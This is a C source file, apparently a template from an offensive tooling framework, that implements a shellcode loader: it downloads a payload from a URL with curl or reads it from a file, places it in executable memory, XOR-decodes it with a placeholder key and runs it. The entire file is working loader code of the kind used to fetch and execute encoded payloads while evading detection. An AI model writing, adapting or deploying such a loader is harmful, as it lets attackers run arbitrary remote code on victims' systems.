#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include "curl_util.h"

void decode(void *buf, size_t size) {
    #ifdef ENCODING_XOR
    int key = {KEY};
    for (size_t i = 0; i < size; i++) {
        ((char *)buf)[i] ^= key;
    }
    #endif
}

void run_curl(char *url) {

    struct MemoryStruct chunk;
    curl_load_memory(url, &chunk);
    void *exec_mem = mmap(NULL, chunk.size, PROT_READ|PROT_WRITE|PROT_EXEC,
                      MAP_ANON|MAP_PRIVATE, -1, 0);
    memcpy(exec_mem, chunk.memory, chunk.size);
    decode(exec_mem, chunk.size);
    int (*func)() = (int(*)())exec_mem;
    func();
    curl_cleanup(&chunk);
    munmap(exec_mem, chunk.size);
}

void run_file(char * filename) {
    FILE * file = fopen(filename, "rb");
    if (!file) {
        perror("fopen");
        return; 
    }
    fseek(file, 0, SEEK_END);
    size_t size = ftell(file);
    fseek(file, 0, SEEK_SET);
    void *exec_mem = mmap(NULL, size, PROT_READ|PROT_WRITE|PROT_EXEC,
                          MAP_ANON|MAP_PRIVATE, -1, 0);
    fread(exec_mem, 1, size, file);
    decode(exec_mem, size);
    fclose(file); 
    int (*func)() = (int(*)())exec_mem;
    func();
    munmap(exec_mem, size);
}

int main (int argc, char *argv[])
{
    if (argc < 2) {
        printf("Usage: %s <url>\n", argv[0]);
        return 0;
    }
    if (strstr(argv[1], "http")) {
        int index = strstr(argv[1], "http") - argv[1];
        if (index ==0) {
            run_curl(argv[1]);  
        }
        else {
            printf("Invalid URL\n");
            return 1;
        }
    }
    else {
        run_file(argv[1]);
    }
    return 0;
}

